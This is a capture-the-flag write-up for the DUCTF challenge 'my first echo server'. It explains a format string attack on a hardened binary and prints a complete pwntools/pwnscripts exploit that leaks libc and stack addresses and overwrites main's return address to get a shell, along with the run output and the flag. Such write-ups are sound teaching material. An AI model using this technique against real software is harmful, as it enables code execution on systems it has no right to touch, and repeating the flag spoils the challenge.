# my first echo server [hard]
Author: k0wa1ski#6150 and Faith#2563

*Hello there! I learnt C last week and already made my own SaaS product, check it out! I even made sure not to use compiler flags like --please-make-me-extremely-insecure, so everything should be swell.*

`nc chal.duc.tf 30001`

Hint - The challenge server is running Ubuntu 18.04.

Attached files: `echos` (sha256: 2311c57a6436e56814e1fe82bdd728f90e5832fda8abc71375ef3ef8d9d239ca)

#### This challenge was quickly finished with [pwnscripts](https://github.com/152334H/pwnscripts). Try it!

## Solving
```C
int main() {
  char s[0x48]; // [rsp+10h] [rbp-50h]
  int64_t cookie = __readfsqword(0x28u); // [rsp+58h] [rbp-8h]
  for (int i = 0; i <= 2; i++) {
    fgets(s, 0x40, stdin);
    printf(s);
  }
  return 0;
}
```
```python
$ checksec echos
[*] 'echos'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
This challenge is a simple exercise in [format string exploitation](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_example/). Given a binary with all security hardening measures enabled, the goal is to open a shell using nothing but user-controlled call**s** to `printf()`.

It's really important that there's more than 1 `printf()` call; as far as I know, it's impossible<sup>1</sup> to exploit a hardened binary with only a single call to `printf()`.

Anyway, with 2 `printf()` calls, the solution is visible to anyone familiar with FSBs<sup>2</sup>:
1. Leak some addresses with `%m$p` in the first call. The two addresses we're leaking here are
   * `__libc_start_main_ret`, which is a libc leak (for FSBs) that's always available in a binary that calls `main()`
   * The stack address, which can usually be leaked from somewhere up in the call stack, mostly because the stack is never cleaned
2. Abuse `%m$n` to replace the return address of `main()` with a jump to a `one_gadget`.

The implementation for both steps is also trivial:

0. Find the `printf()` offsets to the addresses to be leaked using `pwnscripts.fsb.find_offset`.
1. Send a payload of `%m$p,%m$p` (with the offsets found earlier) to leak out the relevant addresses. Calculate the libc base (`context.libc.calc_base`) and the location of the return pointer<sup>3</sup> here.
2. Use `pwntools`' `fmtstr_payload` to generate the whole `%n` payload. Use `write_size='short'` here, because the default `write_size` generates a payload too large for `./echos`' `fgets(64)` to accept.

```python
from pwnscripts import *
context.binary = 'echos'
context.libc_database = 'libc-database'
context.libc = 'libc6_2.27-3ubuntu1_amd64'  # Assumed from prev chals
args = ('chal.duc.tf', 30001)

@context.quiet
def printf(l:str):
    r = remote(*args)
    r.send(l)
    return r.recvline()

# Finding printf offsets.
config.PRINTF_MIN = 7
buffer  = fsb.find_offset.buffer(printf, maxlen=63)
stack   = fsb.find_offset.stack(printf) # This requires config.PRINTF_MIN
ret_off = fsb.find_offset.libc(printf, context.libc.symbols['__libc_start_main_ret']%0x100)
DIST_TO_RET = (ret_off-buffer)*context.bytes

# Leak stack & libc
r = remote(*args)
r.sendline('%{}$p,%{}$p'.format(stack, ret_off))
stack_leak, libc_main_ret = extract_all_hex(r.recvline())
buffer_addr = stack_leak-0x130  # EMPIRICAL OFFSET
context.libc.calc_base('__libc_start_main_ret', libc_main_ret)

# Return to one_gadget; use 'short' to stay within input length
write = {buffer_addr+DIST_TO_RET: context.libc.select_gadget(1)}
r.sendline(payload:=fmtstr_payload(buffer, write, write_size='short'))
strlen = payload.find(b'\0')         # This part is here to shut up the whitespace spam of fmtstr_payload
r.recvuntil(payload[strlen-4:strlen])
r.interactive()
```
That's it.
```bash
[*] pwnscripts.fsb.find_offset for buffer: 8
[*] pwnscripts.fsb.find_offset for 'stack': 16
[*] pwnscripts.fsb.find_offset for 'libc': 19
[+] Opening connection to chal.duc.tf on port 30001: Done
[*] Switching to interactive mode
$ ls
echos
flag.txt
$ cat flag.txt
```
## Flag
`DUCTF{D@N6340U$_AF_F0RMAT_STTR1NG$}`

## Footnotes
1. And do inform me if I'm wrong!
2. Format String Bugs. And perhaps *familiar* is too weak a term: "done enough times to be second nature" may be more accurate.
3. There's a small detail neglected here, because there isn't actually an automated method to find the stack's return pointer in `pwnscripts` (for now). In order to find where `main()`'s stack resided, I used `gdb` to find the approximate difference between the leaked stack address and `main()`'s stack, followed by a `%s` test to ensure that the calculated location of `main()`'s stack was valid:
   ```python
   # ... insert first leak here ...
   # Test that leaked address calculation is valid:
   print_stack = '%{}$s'.format(buffer+1).ljust(8).encode() + pack(stack_leak-0x130+0x10) + cyclic(40).encode()
   r.sendline(print_stack)
   print(r.recvall())
   ```
   ```python
   [+] Opening connection to chal.duc.tf on port 30001: Done
   b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\n'
   ```